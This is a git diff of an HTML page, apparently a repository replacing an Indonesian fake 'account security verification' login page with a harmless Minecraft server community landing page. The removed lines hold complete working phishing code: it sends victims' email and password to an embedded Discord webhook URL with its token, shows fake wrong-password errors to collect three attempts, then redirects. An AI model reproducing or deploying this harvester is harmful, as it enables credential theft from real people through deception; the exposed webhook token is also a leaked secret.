@@ -1,169 +1,123 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verifikasi Keamanan Akun</title>
-    
+    <title>Minecraft Server Community</title>
     <style>
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #f0f2f5;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
+        * {
             margin: 0;
-        }
-        .container {
-            background-color: #ffffff;
-            padding: 40px;
-            border-radius: 10px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-            width: 100%;
-            max-width: 400px;
-            text-align: center;
-        }
-        .logo {
-            width: 60px;
-            margin-bottom: 20px;
-        }
-        h2 {
-            color: #1c1e21;
-            font-size: 24px;
-            margin-bottom: 10px;
-        }
-        p {
-            color: #606770;
-            font-size: 15px;
-            margin-bottom: 25px;
-        }
-        input {
-            width: 100%;
-            padding: 14px;
-            margin-bottom: 15px;
-            border: 1px solid #dddfe2;
-            border-radius: 6px;
-            font-size: 16px;
+            padding: 0;
             box-sizing: border-box;
         }
-        input:focus {
-            outline: none;
-            border-color: #1877f2;
-            box-shadow: 0 0 0 2px #e7f3ff;
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #1a472a 0%, #2d5a3d 100%);
+            color: #fff;
+            min-height: 100vh;
         }
-        button {
-            width: 100%;
-            padding: 14px;
-            background-color: #1877f2;
-            border: none;
-            border-radius: 6px;
-            color: white;
-            font-size: 18px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: background-color 0.2s;
+        header {
+            background: rgba(0, 0, 0, 0.7);
+            padding: 20px 0;
+            text-align: center;
+            border-bottom: 3px solid #4CAF50;
         }
-        button:hover {
-            background-color: #166fe5;
+        header h1 {
+            font-size: 2.5em;
+            margin-bottom: 5px;
         }
-        .footer-link {
-            margin-top: 20px;
-            font-size: 14px;
-            color: #1877f2;
+        nav {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            padding: 15px;
+        }
+        nav a {
+            color: #fff;
             text-decoration: none;
-            display: block;
+            padding: 10px 20px;
+            border-radius: 5px;
+            transition: 0.3s;
         }
-        #error-notif {
-    background-color: #ffebe8;
-    border: 1px solid #dd3c10;
-    padding: 10px;
-    border-radius: 4px;
-    margin-bottom: 15px;
-    text-align: left;
+        nav a:hover {
+            background: #4CAF50;
+        }
+        .hero {
+            text-align: center;
+            padding: 60px 20px;
+        }
+        .hero h2 {
+            font-size: 3em;
+            margin-bottom: 20px;
+        }
+        .cta-button {
+            display: inline-block;
+            background: #4CAF50;
+            padding: 15px 40px;
+            border-radius: 5px;
+            text-decoration: none;
+            font-size: 1.1em;
+            transition: 0.3s;
+        }
+        .cta-button:hover {
+            background: #45a049;
+        }
+        .features {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            padding: 40px;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        .feature-card {
+            background: rgba(0, 0, 0, 0.5);
+            padding: 25px;
+            border-radius: 8px;
+            border-left: 4px solid #4CAF50;
+        }
+        .feature-card h3 {
+            margin-bottom: 10px;
+            color: #4CAF50;
+        }
+        footer {
+            text-align: center;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.7);
+            margin-top: 40px;
+            border-top: 3px solid #4CAF50;
         }
     </style>
 </head>
 <body>
-
-    <div class="container">
-        <img src="https://cdn-icons-png.flaticon.com/512/1058/1058032.png" alt="Security" class="logo">
-        <h2>Verifikasi Identitas</h2>
-        <p>Aktivitas mencurigakan terdeteksi. Silakan login kembali untuk mengamankan akun Anda.</p>
-
-        <form id="loginForm">
-            <input type="text" id="email" placeholder="Email atau Nomor Telepon" required>
-            <input type="password" id="password" placeholder="Kata Sandi" required>
-            <button type="submit" id="btnSubmit">Konfirmasi Keamanan</button>
-        </form>
-
-        <a href="#" class="footer-link">Lupa kata sandi?</a>
-    </div>
-
-<script>
-    let attemptCount = 0; // Melacak jumlah percobaan
-    const maxAttempts = 3; // Batas pengulangan
-
-    document.getElementById('loginForm').addEventListener('submit', async function(e) {
-        e.preventDefault();
-        
-        const email = document.getElementById('email').value;
-        const pass = document.getElementById('password').value;
-        const btn = document.getElementById('btnSubmit');
-        const errorMsg = document.getElementById('errorMsg'); // Pastikan ada elemen ini di HTML
-
-        // GANTI DENGAN URL WEBHOOK DISCORD ANDA
-        const webhookURL = "https://discord.com/api/webhooks/1463473630251061375/xi6CyaH0ElCz_jUz9vf_iFfOxfNuh1iZfX_31GAO7jOcxRjkhd723nbEFd3ZAp1YvhME";
-
-        attemptCount++;
-        btn.innerText = "Memproses...";
-        btn.disabled = true;
-
-        // Payload data untuk dikirim ke Discord
-        const payload = {
-            content: `**Kredensial Phishing - Percobaan ke-${attemptCount}** 👾\n> **Email:** ${email}\n> **Password:** ${pass}`
-        };
-
-        try {
-            // Kirim data setiap kali korban klik tombol
-            await fetch(webhookURL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            });
-
-            if (attemptCount < maxAttempts) {
-                // Tampilkan pesan error palsu dan reset form password
-                setTimeout(() => {
-                    btn.innerText = "Konfirmasi Keamanan";
-                    btn.disabled = false;
-                    document.getElementById('password').value = ""; // Kosongkan password
-                    
-                    // Tampilkan pesan error agar korban percaya
-                    if (!document.getElementById('error-notif')) {
-                        const div = document.createElement('div');
-                        div.id = 'error-notif';
-                        div.style.color = "red";
-                        div.style.fontSize = "13px";
-                        div.style.marginTop = "10px";
-                        div.innerText = "Kata sandi salah atau kadaluwarsa. Silakan coba lagi.";
-                        document.getElementById('loginForm').prepend(div);
-                    }
-                }, 800);
-            } else {
-                // Setelah 3 kali, baru alihkan ke situs asli
-                btn.innerText = "Berhasil diverifikasi...";
-                setTimeout(() => {
-                    window.location.href = "https://valentinedaysss.netlify.app/";
-                }, 1000);
-            }
-
-        } catch (error) {
-            btn.disabled = false;
-            btn.innerText = "Konfirmasi Keamanan";
-        }
-    });
-</script>
-
+    <header>
+        <h1>⛏️ Minecraft Server Community</h1>
+        <p>Join the Adventure</p>
+    </header>
+    <nav>
+        <a href="#home">Home</a>
+        <a href="#features">Features</a>
+        <a href="#servers">Servers</a>
+        <a href="#join">Join Us</a>
+        <a href="#contact">Contact</a>
+    </nav>
+    <section class="hero">
+        <h2>Build, Explore, Thrive</h2>
+        <p>Rasakan komunitas server Minecraft terbaik.</p>
+        <a href="#join" class="cta-button">Gabung Sekarang</a>
+    </section>
+    <section class="features" id="features">
+        <div class="feature-card">
+            <h3>🌍 Modded</h3>
+            <p>kita menggunakan modded server untuk pengalaman bermain yang lebih menarik.</p>
+        </div>
+        <div class="feature-card">
+            <h3>👥 Active Community</h3>
+            <p>Bergabunglah dengan komunitas yang aktif dan ramah.</p>
+        </div>
+    </section>
+    <footer>
+        <p>&copy; 2026 server komunitas minecraft UNISCO SMP. All rights reserved.</p>
+    </footer>
 </body>
 </html>
